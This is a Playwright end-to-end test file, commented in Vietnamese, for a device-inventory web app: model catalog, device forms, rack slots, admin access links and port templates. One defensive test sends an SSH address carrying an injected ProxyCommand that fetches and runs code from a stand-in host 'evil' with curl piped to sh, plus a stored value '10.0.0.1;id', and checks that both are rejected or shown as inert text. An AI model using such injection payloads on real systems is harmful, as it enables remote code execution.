import { expect, test, type Page } from '@playwright/test';
import {
  E2E_SA,
  catalogItem,
  devicesPageButton,
  firstLogin,
  horizontalOverflow,
  resetCatalog,
  resetDevices,
  resetUsers,
  sql,
  uniqueStamp,
  writeHeaders,
} from './helpers';

/*
 * Model thiết bị (Q-26, Epic 11) trên stack thật: Danh mục Model (khoá chuẩn hoá, ảnh model dùng cho
 * mọi máy, chặn xóa model còn máy), form thiết bị chọn / tạo model tại chỗ + dải U trống + Truy cập
 * quản trị, cổng mẫu sinh danh sách cổng và mặt cổng ở tab Sơ đồ cổng. Luật chi tiết nằm ở
 * `api/test/device-models.spec.ts`; bài này giữ mức khói trên giao diện.
 */

test.beforeEach(() => {
  resetUsers();
  resetDevices();
  resetCatalog();
});

/** Ảnh PNG 1×1 hợp lệ — `files` kiểm theo nội dung. */
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

async function switchTypeId(page: Page): Promise<string> {
  const catalog = (await (await page.request.get('/api/v1/catalog')).json()) as { deviceTypes: { id: string; name: string }[] };
  return catalog.deviceTypes.find((t) => t.name === 'Switch')!.id;
}

async function createModel(page: Page, data: Record<string, unknown>): Promise<string> {
  const res = await page.request.post('/api/v1/device-models', { headers: await writeHeaders(page), data });
  expect(res.status(), await res.text()).toBe(201);
  return ((await res.json()) as { id: string }).id;
}

async function createDevice(page: Page, data: Record<string, unknown>): Promise<string> {
  const res = await page.request.post('/api/v1/devices', { headers: await writeHeaders(page), data });
  expect(res.status(), await res.text()).toBe(201);
  return ((await res.json()) as { device: { id: string } }).device.id;
}

async function openModelsTab(page: Page) {
  await page.goto('/admin/catalog');
  await page.getByRole('tab', { name: 'Model thiết bị', exact: true }).click();
}

test.describe('Model thiết bị (Q-26)', () => {
  test('Danh mục: SA thêm model gắn tủ; gõ khác hoa thường / gạch là trùng; ảnh model hiện ở mọi máy của model; xóa model còn máy bị chặn', async ({ page }) => {
    test.setTimeout(150_000);
    await firstLogin(page, E2E_SA);
    const stamp = uniqueStamp();
    const model = `E2E-C9300-${stamp}`;

    await openModelsTab(page);
    await page.getByRole('button', { name: 'Thêm model', exact: true }).click();
    let dialog = page.getByRole('dialog', { name: 'Thêm model thiết bị' });
    await dialog.getByRole('button', { name: 'Loại thiết bị' }).click();
    await page.getByRole('option', { name: 'Switch', exact: true }).click();
    await dialog.getByRole('textbox', { name: /Mã model/ }).fill(model);
    await dialog.getByRole('textbox', { name: /Hãng/ }).fill('Cisco');
    await dialog.getByRole('radio', { name: 'Có' }).check();
    await dialog.getByRole('spinbutton', { name: /Số U/ }).fill('1');
    await dialog.getByRole('button', { name: 'Lưu', exact: true }).click();
    await expect(page.getByText(`Đã thêm model ${model}.`)).toBeVisible();
    const row = page.getByRole('row', { name: new RegExp(model) });
    await expect(row.getByText('1U', { exact: true })).toBeVisible();

    // Đường hỏng: cùng mã sau khi bỏ gạch / chữ hoa → báo tại ô kèm "Dùng model …", không tạo bản thứ hai.
    await page.getByRole('button', { name: 'Thêm model', exact: true }).click();
    dialog = page.getByRole('dialog', { name: 'Thêm model thiết bị' });
    await dialog.getByRole('button', { name: 'Loại thiết bị' }).click();
    await page.getByRole('option', { name: 'Switch', exact: true }).click();
    await dialog.getByRole('textbox', { name: /Mã model/ }).fill(model.toLowerCase().replace(/-/g, ' '));
    await dialog.getByRole('radio', { name: 'Không' }).check();
    await dialog.getByRole('button', { name: 'Lưu', exact: true }).click();
    await expect(dialog.getByText(new RegExp(`Đã có model "${model}"`))).toBeVisible();
    await expect(dialog.getByRole('button', { name: `Dùng model ${model}` })).toBeVisible();
    await dialog.getByRole('button', { name: 'Hủy' }).click();

    // Ảnh model + hai máy gán model: cả hai dùng ảnh model.
    const list = (await (await page.request.get(`/api/v1/device-models?search=${encodeURIComponent(model)}`)).json()) as { items: { id: string }[] };
    const modelId = list.items[0].id;
    const upload = await page.request.post('/api/v1/files', {
      headers: await writeHeaders(page),
      multipart: { ownerType: 'device_model', ownerId: modelId, file: { name: `model-${stamp}.png`, mimeType: 'image/png', buffer: PNG } },
    });
    expect(upload.status(), await upload.text()).toBe(201);
    const photos = await page.request.patch(`/api/v1/device-models/${modelId}/photos`, {
      headers: await writeHeaders(page),
      data: { front: ((await upload.json()) as { id: string }).id },
    });
    expect(photos.status(), await photos.text()).toBe(200);
    const typeId = await switchTypeId(page);
    const a = await createDevice(page, { code: `SW-E2E-MA${stamp}`, name: 'Máy A', deviceTypeId: typeId, deviceModelId: modelId });
    const b = await createDevice(page, { code: `SW-E2E-MB${stamp}`, name: 'Máy B', deviceTypeId: typeId, deviceModelId: modelId });
    for (const id of [a, b]) {
      expect((await page.request.get(`/api/v1/devices/${id}/photo/front`)).status()).toBe(200);
    }
    await page.goto(`/devices/${b}`);
    await expect(page.getByText(`Ảnh chung của model ${model}`).first()).toBeVisible();

    // Xóa model còn máy dùng: hỏi trước, server từ chối và nói rõ còn bao nhiêu máy.
    await openModelsTab(page);
    await page.getByRole('row', { name: new RegExp(model) }).getByRole('button', { name: `Việc với model ${model}` }).click();
    await page.getByRole('menuitem', { name: 'Xóa' }).click();
    const confirm = page.getByRole('dialog', { name: `Xóa model ${model}?` });
    await confirm.getByRole('button', { name: 'Xóa', exact: true }).click();
    await expect(page.getByText(/Model còn 2 máy dùng/)).toBeVisible();
  });

  test('390px: tab Model thiết bị đọc được, không tràn ngang', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await firstLogin(page, E2E_SA);
    const stamp = uniqueStamp();
    await createModel(page, { deviceTypeId: await switchTypeId(page), model: `E2E-M390-${stamp}`, manufacturer: 'HP', rackMountable: false });
    await openModelsTab(page);
    await expect(page.getByText(`E2E-M390-${stamp}`)).toBeVisible();
    expect(await horizontalOverflow(page)).toBeLessThanOrEqual(0);
  });

  test('form thiết bị: tạo model ngay trong form rồi lưu máy; máy thứ hai chọn lại model + U từ dải trống; gõ U trùng bị báo tại ô; model không gắn tủ thì không có ô Tủ; Truy cập quản trị thành link', async ({ page }) => {
    test.setTimeout(180_000);
    await firstLogin(page, E2E_SA);
    const stamp = uniqueStamp();
    const siteCode = `E2E-MF${stamp}`;
    const cabinetCode = `E2E-MFR${stamp}`;
    const siteId = await catalogItem(page, 'site', { code: siteCode, name: `Site model ${stamp}` });
    await catalogItem(page, 'cabinet', { siteId, code: cabinetCode, uHeight: 12 });
    const model = `E2E-XG${stamp}`;

    await page.goto('/devices');
    await devicesPageButton(page, 'Thêm thiết bị').click();
    let form = page.getByRole('dialog', { name: /Thêm thiết bị/ });
    await form.getByRole('textbox', { name: 'Mã thiết bị' }).fill(`FW-E2E-MF1${stamp}`);
    await form.getByRole('textbox', { name: 'Tên gọi' }).fill('Firewall tầng 1');
    await form.getByRole('combobox', { name: 'Model' }).fill(model);
    await page.getByRole('button', { name: `Tạo model mới "${model}"` }).click();
    const modelDialog = page.getByRole('dialog', { name: 'Thêm model thiết bị' });
    await modelDialog.getByRole('button', { name: 'Loại thiết bị' }).click();
    await page.getByRole('option', { name: 'Switch', exact: true }).click();
    await modelDialog.getByRole('radio', { name: 'Có' }).check();
    await modelDialog.getByRole('spinbutton', { name: /Số U/ }).fill('1');
    await modelDialog.getByRole('button', { name: 'Lưu', exact: true }).click();
    await expect(modelDialog).toBeHidden();
    // Về form: chữ đang nhập còn nguyên, Loại theo model.
    await expect(form.getByRole('textbox', { name: 'Mã thiết bị' })).toHaveValue(`FW-E2E-MF1${stamp}`);
    await expect(form.getByRole('button', { name: 'Loại' })).toBeDisabled();
    await form.getByRole('button', { name: 'Site' }).click();
    await page.getByRole('option', { name: new RegExp(`^${siteCode}`) }).click();
    await form.getByRole('button', { name: 'Tủ mạng' }).click();
    await page.getByRole('option', { name: `${siteCode} · ${cabinetCode}` }).click();
    await form.getByRole('group', { name: 'U trống:' }).getByRole('button', { name: 'U1–U12' }).click();
    await expect(form.getByRole('textbox', { name: 'U bắt đầu' })).toHaveValue('1');
    await form.getByRole('button', { name: 'Lưu', exact: true }).click();
    await expect(page.getByText(new RegExp(`Đã thêm .*FW-E2E-MF1${stamp}`))).toBeVisible();

    // Máy thứ hai: chọn lại model từ gợi ý, U từ dải trống (U1 đã có máy).
    await devicesPageButton(page, 'Thêm thiết bị').click();
    form = page.getByRole('dialog', { name: /Thêm thiết bị/ });
    await form.getByRole('textbox', { name: 'Mã thiết bị' }).fill(`FW-E2E-MF2${stamp}`);
    await form.getByRole('textbox', { name: 'Tên gọi' }).fill('Firewall tầng 2');
    await form.getByRole('combobox', { name: 'Model' }).fill(model.toLowerCase());
    await page.getByRole('option', { name: new RegExp(model) }).click();
    await form.getByRole('button', { name: 'Site' }).click();
    await page.getByRole('option', { name: new RegExp(`^${siteCode}`) }).click();
    await form.getByRole('button', { name: 'Tủ mạng' }).click();
    await page.getByRole('option', { name: `${siteCode} · ${cabinetCode}` }).click();
    // Đường hỏng: gõ U đang có máy → báo ngay tại ô.
    await form.getByRole('textbox', { name: 'U bắt đầu' }).fill('1');
    await expect(form.getByText(new RegExp(`Chỗ U1 đang có FW-E2E-MF1${stamp}`))).toBeVisible();
    await form.getByRole('group', { name: 'U trống:' }).getByRole('button', { name: 'U2–U12' }).click();
    // Truy cập quản trị: Web 10.0.1.1:8443.
    await form.getByRole('button', { name: '+ Thêm đường truy cập' }).click();
    await form.getByRole('textbox', { name: 'Địa chỉ 1' }).fill('10.0.1.1');
    await form.getByRole('textbox', { name: 'Cổng 1' }).fill('8443');
    await form.getByRole('button', { name: 'Lưu', exact: true }).click();
    await expect(page.getByText(new RegExp(`Đã thêm .*FW-E2E-MF2${stamp}`))).toBeVisible();
    await page.getByRole('link', { name: `FW-E2E-MF2${stamp}` }).click();
    await expect(page.getByRole('link', { name: '10.0.1.1:8443' })).toHaveAttribute('href', 'https://10.0.1.1:8443');

    // Model không gắn tủ: form không hỏi Tủ.
    const printer = `E2E-PR${stamp}`;
    await createModel(page, { deviceTypeId: await switchTypeId(page), model: printer, rackMountable: false });
    await page.goto('/devices');
    await devicesPageButton(page, 'Thêm thiết bị').click();
    form = page.getByRole('dialog', { name: /Thêm thiết bị/ });
    await form.getByRole('combobox', { name: 'Model' }).fill(printer);
    await page.getByRole('option', { name: new RegExp(printer) }).click();
    await expect(form.getByText(`Model ${printer} không gắn tủ — máy chỉ cần Site.`)).toBeVisible();
    await expect(form.getByRole('button', { name: 'Tủ mạng' })).toHaveCount(0);
  });

  test('đòn chèn lệnh qua Truy cập quản trị: API từ chối địa chỉ SSH độc; dữ liệu cũ đã lỡ lưu thì trang chỉ hiện chữ, không có lệnh để chép', async ({ page }) => {
    await firstLogin(page, E2E_SA);
    const stamp = uniqueStamp();
    const typeId = await switchTypeId(page);
    const attack = await page.request.post('/api/v1/devices', {
      headers: await writeHeaders(page),
      data: { code: `SW-E2E-INJ${stamp}`, name: 'Máy độc', deviceTypeId: typeId, accessPoints: [{ kind: 'ssh', address: '-oProxyCommand=curl${IFS}evil|sh' }] },
      failOnStatusCode: false,
    });
    expect(attack.status()).toBe(400);
    expect(await attack.json()).toMatchObject({ code: 'DEVICE_ACCESS_INVALID' });
    // Dữ liệu cũ ghi thẳng vào DB (trước khi có luật): trang không dựng lệnh từ nó.
    const id = await createDevice(page, { code: `SW-E2E-INJ${stamp}`, name: 'Máy cũ', deviceTypeId: typeId });
    // Dựng JSON bằng hàm Postgres: `sql()` đi qua shell trong dấu nháy kép.
    sql(`UPDATE device SET access_points = jsonb_build_array(jsonb_build_object('kind', 'ssh', 'address', '10.0.0.1;id', 'port', NULL)) WHERE id = '${id}'`);
    await page.goto(`/devices/${id}`);
    await expect(page.getByText('10.0.0.1;id')).toBeVisible();
    await expect(page.getByRole('button', { name: 'Chép lệnh' })).toHaveCount(0);
    await expect(page.locator('code')).toHaveCount(0);
  });

  test('cổng mẫu: model Gi1/0/[1-48] + Te1/1/[1-4] → máy có 52 cổng; dây vào Gi1/0/1 thì ô đó đang dùng; mẫu dải ngược bị báo tại chỗ', async ({ page }) => {
    test.setTimeout(150_000);
    await firstLogin(page, E2E_SA);
    const stamp = uniqueStamp();
    const typeId = await switchTypeId(page);
    const modelId = await createModel(page, {
      deviceTypeId: typeId,
      model: `E2E-SW52-${stamp}`,
      rackMountable: false,
      portTemplate: [
        { pattern: 'Gi1/0/[1-48]', kind: 'rj45' },
        { pattern: 'Te1/1/[1-4]', kind: 'sfp+' },
      ],
    });
    const sw = await createDevice(page, { code: `SW-E2E-P52${stamp}`, name: 'Switch 52', deviceTypeId: typeId, deviceModelId: modelId });
    const pc = await createDevice(page, { code: `PC-E2E-P52${stamp}`, name: 'PC', deviceTypeId: typeId });
    const linked = await page.request.post(`/api/v1/devices/${sw}/ports/link`, {
      headers: await writeHeaders(page),
      data: { portLabel: 'Gi1/0/1', connectedDeviceId: pc, connectedPort: 'eth0', cableTypeId: '' },
    });
    expect(linked.status(), await linked.text()).toBeLessThan(300);

    await page.goto(`/devices/${sw}`);
    await page.getByRole('tab', { name: 'Sơ đồ cổng' }).click();
    const face = page.getByRole('region', { name: 'Mặt cổng' });
    await expect(face.getByText('đang dùng 1/52')).toBeVisible();
    await expect(face.getByRole('button', { name: `Gi1/0/1 → PC-E2E-P52${stamp} · eth0` })).toBeVisible();
    await expect(face.getByRole('button', { name: 'Te1/1/4 — trống' })).toBeVisible();
    await face.getByRole('button', { name: 'Hiện cả cổng trống (51)' }).click();
    await expect(face.getByLabel('Cổng trống')).toContainText('Gi1/0/2');

    // Đường hỏng: mẫu dải ngược báo ngay trong hộp model, không lưu.
    await openModelsTab(page);
    await page.getByRole('button', { name: 'Thêm model', exact: true }).click();
    const dialog = page.getByRole('dialog', { name: 'Thêm model thiết bị' });
    await dialog.getByRole('button', { name: '+ Thêm nhóm cổng' }).click();
    await dialog.getByRole('textbox', { name: 'Mẫu tên cổng 1' }).fill('Port[8-1]');
    await expect(dialog.getByText('Dải [8-1] phải từ số nhỏ tới số lớn.')).toBeVisible();
  });
});
